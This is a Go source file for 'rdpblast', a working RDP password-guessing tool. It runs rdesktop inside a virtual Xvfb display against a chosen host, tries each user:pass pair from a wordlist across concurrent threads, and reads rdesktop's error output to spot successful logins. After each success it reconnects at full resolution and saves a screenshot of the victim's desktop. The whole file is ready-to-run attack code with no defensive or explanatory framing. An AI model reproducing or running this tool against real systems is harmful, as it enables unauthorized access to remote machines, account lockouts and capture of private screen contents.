package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ─────────────────────────────────────────────
//  ANSI colours
// ─────────────────────────────────────────────

const (
	colReset = "\033[0m"
	colRed   = "\033[31m"
	colGreen = "\033[32m"
	colCyan  = "\033[36m"
	colBold  = "\033[1m"
	colGray  = "\033[90m"
)

func green(s string) string { return colGreen + s + colReset }
func red(s string) string   { return colRed + s + colReset }
func gray(s string) string  { return colGray + s + colReset }
func cyan(s string) string  { return colCyan + s + colReset }
func bold(s string) string  { return colBold + s + colReset }

// ─────────────────────────────────────────────
//  Virtual display counter (one per goroutine)
// ─────────────────────────────────────────────

var displayCounter int32 = 99

func nextDisplay() string {
	n := atomic.AddInt32(&displayCounter, 1)
	return fmt.Sprintf(":%d", n)
}

// ─────────────────────────────────────────────
//  Start / stop Xvfb helpers
// ─────────────────────────────────────────────

func startXvfb(display string) (*exec.Cmd, error) {
	cmd := exec.Command("Xvfb", display, "-screen", "0", "1280x800x24")
	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("Xvfb start failed: %w", err)
	}
	time.Sleep(350 * time.Millisecond) // give Xvfb time to bind the socket
	return cmd, nil
}

func killProc(cmd *exec.Cmd) {
	if cmd != nil && cmd.Process != nil {
		_ = cmd.Process.Kill()
		_ = cmd.Wait()
	}
}

// ─────────────────────────────────────────────
//  rdesktop auth test
//
//  rdesktop has no --auth-only flag, so we:
//    • spin up a tiny Xvfb virtual display
//    • run rdesktop with a 1x1 window and a short timeout (-T is just title)
//    • rdesktop prints "ERROR: TS_LOGON_FAILURE" to stderr on bad creds
//    • rdesktop prints "Connection established" to stderr on success
//    • we kill the process once we've seen enough output
// ─────────────────────────────────────────────

func testAuth(host string, port int, user, pass, domain string) (bool, string) {
	display := nextDisplay()

	xvfb, err := startXvfb(display)
	if err != nil {
		return false, "Xvfb unavailable"
	}
	defer killProc(xvfb)

	target := fmt.Sprintf("%s:%d", host, port)
	args := []string{
		"-u", user,
		"-p", pass,
		"-g", "1x1",       // smallest possible window — we only need auth
		"-T", "rdpblast",  // window title
		"-N",              // no numlock sync
		"-a", "16",        // colour depth
	}
	if domain != "" {
		args = append(args, "-d", domain)
	}
	args = append(args, target)

	var stderr bytes.Buffer
	cmd := exec.Command("rdesktop", args...)
	cmd.Env = append(os.Environ(), "DISPLAY="+display)
	cmd.Stderr = &stderr

	_ = cmd.Start()

	// Poll stderr for up to 8 seconds
	deadline := time.Now().Add(8 * time.Second)
	authed := false
	reason := "authentication failed"

	for time.Now().Before(deadline) {
		time.Sleep(100 * time.Millisecond)
		out := strings.ToLower(stderr.String())

		if strings.Contains(out, "connection established") ||
			strings.Contains(out, "desktop name") {
			authed = true
			break
		}
		if strings.Contains(out, "logon_failure") ||
			strings.Contains(out, "logon failure") ||
			strings.Contains(out, "wrong password") {
			reason = "wrong credentials"
			break
		}
		if strings.Contains(out, "connection refused") ||
			strings.Contains(out, "unable to connect") {
			reason = "connection refused / unreachable"
			break
		}
		if strings.Contains(out, "account") && strings.Contains(out, "locked") {
			reason = "account locked or disabled"
			break
		}
		if cmd.ProcessState != nil {
			break // process already exited
		}
	}

	killProc(cmd)
	return authed, reason
}

// ─────────────────────────────────────────────
//  Screenshot
//
//  On a confirmed hit we re-connect at full
//  resolution, wait for the desktop to paint,
//  capture with ImageMagick import (or scrot),
//  then kill the session immediately.
// ─────────────────────────────────────────────

func takeScreenshot(host string, port int, user, pass, domain, outDir string) (string, error) {
	display := nextDisplay()

	xvfb, err := startXvfb(display)
	if err != nil {
		return "", fmt.Errorf("Xvfb: %w", err)
	}
	defer killProc(xvfb)

	target := fmt.Sprintf("%s:%d", host, port)
	args := []string{
		"-u", user,
		"-p", pass,
		"-g", "1280x800",
		"-T", "rdpblast",
		"-N",
		"-a", "16",
	}
	if domain != "" {
		args = append(args, "-d", domain)
	}
	args = append(args, target)

	env := append(os.Environ(), "DISPLAY="+display)

	rdp := exec.Command("rdesktop", args...)
	rdp.Env = env
	if err := rdp.Start(); err != nil {
		return "", fmt.Errorf("rdesktop start failed: %w", err)
	}
	defer killProc(rdp)

	// Wait for the remote desktop to fully render
	time.Sleep(5 * time.Second)

	// Build output path
	ts := time.Now().Format("20060102_150405")
	safeName := strings.NewReplacer("\\", "_", "/", "_", ":", "_").Replace(user)
	filename := fmt.Sprintf("%s_%s_%s.png", host, safeName, ts)
	outPath := filepath.Join(outDir, filename)

	// Try ImageMagick import first, fall back to scrot
	imp := exec.Command("import", "-display", display, "-window", "root", outPath)
	imp.Env = env
	if err := imp.Run(); err != nil {
		scr := exec.Command("scrot", "--display", display, outPath)
		scr.Env = env
		if err2 := scr.Run(); err2 != nil {
			return "", fmt.Errorf("screenshot failed (import: %v | scrot: %v)", err, err2)
		}
	}

	// Deferred killProc(rdp) above handles immediate logout
	return outPath, nil
}

// ─────────────────────────────────────────────
//  Entry point
// ─────────────────────────────────────────────

func main() {
	target   := flag.String("t", "", "Target RDP host / IP  (required)")
	port     := flag.Int("p", 3389, "RDP port")
	wordlist := flag.String("f", "", "Credentials file, one user:pass per line  (required)")
	domain   := flag.String("d", "", "Windows domain (optional)")
	threads  := flag.Int("n", 1, "Concurrent threads")
	outDir   := flag.String("o", "/home/kelevran/screenshot", "Screenshot output directory")
	flag.Parse()

	if *target == "" || *wordlist == "" {
		fmt.Printf("\n%s\n\n", bold(cyan("rdpblast — RDP credential tester (rdesktop)")))
		fmt.Println("Usage: rdpblast -t <host> -f <wordlist> [options]")
		fmt.Println()
		fmt.Println("  -t  string   Target IP / hostname          (required)")
		fmt.Println("  -f  string   Credentials file user:pass    (required)")
		fmt.Println("  -p  int      RDP port              (default 3389)")
		fmt.Println("  -d  string   Windows domain        (optional)")
		fmt.Println("  -n  int      Threads               (default 1)")
		fmt.Println("  -o  string   Screenshot dir        (default /home/kelevran/screenshot)")
		fmt.Println()
		os.Exit(1)
	}

	// Verify required binaries
	missing := false
	for _, bin := range []string{"rdesktop", "Xvfb"} {
		if _, err := exec.LookPath(bin); err != nil {
			fmt.Printf(red("[ERROR]")+" %q not found in PATH\n", bin)
			missing = true
		}
	}
	if missing {
		fmt.Println()
		fmt.Println("Install with:")
		fmt.Println("  sudo apt-get install -y rdesktop xvfb imagemagick")
		os.Exit(1)
	}
	if _, err := exec.LookPath("import"); err != nil {
		fmt.Println(red("[WARN]") + "  ImageMagick 'import' not found — screenshots may fail.")
		fmt.Println("        sudo apt-get install -y imagemagick")
	}

	// Ensure screenshot dir exists
	if err := os.MkdirAll(*outDir, 0755); err != nil {
		fmt.Printf(red("[ERROR]")+" Cannot create screenshot dir %s: %v\n", *outDir, err)
		os.Exit(1)
	}

	// ── Read credentials ─────────────────────────────────────────────
	type cred struct {
		user string
		pass string
		line int
	}

	f, err := os.Open(*wordlist)
	if err != nil {
		fmt.Printf(red("[ERROR]")+" Cannot open wordlist: %v\n", err)
		os.Exit(1)
	}
	defer f.Close()

	var creds []cred
	scanner := bufio.NewScanner(f)
	lineNum := 0
	for scanner.Scan() {
		lineNum++
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		if len(parts) != 2 || parts[0] == "" {
			fmt.Printf(gray(fmt.Sprintf("  [SKIP] line %d — bad format: %q", lineNum, line))+"\n")
			continue
		}
		creds = append(creds, cred{parts[0], parts[1], lineNum})
	}
	if err := scanner.Err(); err != nil {
		fmt.Printf(red("[ERROR]")+" Reading wordlist: %v\n", err)
		os.Exit(1)
	}

	// ── Banner ───────────────────────────────────────────────────────
	fmt.Printf("\n%s\n", bold(cyan("  rdpblast — RDP Credential Tester  [rdesktop]")))
	fmt.Println(strings.Repeat("─", 58))
	fmt.Printf("  Target   : %s\n", bold(*target))
	fmt.Printf("  Port     : %d\n", *port)
	fmt.Printf("  Wordlist : %s  (%d credentials)\n", *wordlist, len(creds))
	fmt.Printf("  Threads  : %d\n", *threads)
	fmt.Printf("  Shots    : %s\n", *outDir)
	fmt.Println(strings.Repeat("─", 58))

	// ── Worker pool ──────────────────────────────────────────────────
	sem := make(chan struct{}, *threads)
	var wg sync.WaitGroup
	var mu sync.Mutex
	var hits, fails int

	for _, c := range creds {
		c := c
		sem <- struct{}{}
		wg.Add(1)
		go func() {
			defer func() { <-sem; wg.Done() }()

			ok, reason := testAuth(*target, *port, c.user, c.pass, *domain)

			mu.Lock()
			defer mu.Unlock()

			if ok {
				hits++
				fmt.Printf("\n  %s  %s : %s\n",
					bold(green("[SUCCESS]")), bold(c.user), c.pass)

				shot, err := takeScreenshot(*target, *port, c.user, c.pass, *domain, *outDir)
				if err != nil {
					fmt.Printf("          %s Screenshot failed: %v\n", red("↳"), err)
				} else {
					fmt.Printf("          %s Screenshot: %s\n", green("↳"), shot)
				}
				fmt.Println()
			} else {
				fails++
				fmt.Printf("  %s  %s : %s  %s\n",
					red("[FAILED] "), c.user, c.pass, gray("("+reason+")"))
			}
		}()
	}

	wg.Wait()
	fmt.Println(strings.Repeat("─", 58))
	fmt.Printf("\n  Done — %s   %s\n\n",
		bold(green(fmt.Sprintf("%d success", hits))),
		bold(red(fmt.Sprintf("%d failed", fails))),
	)
}
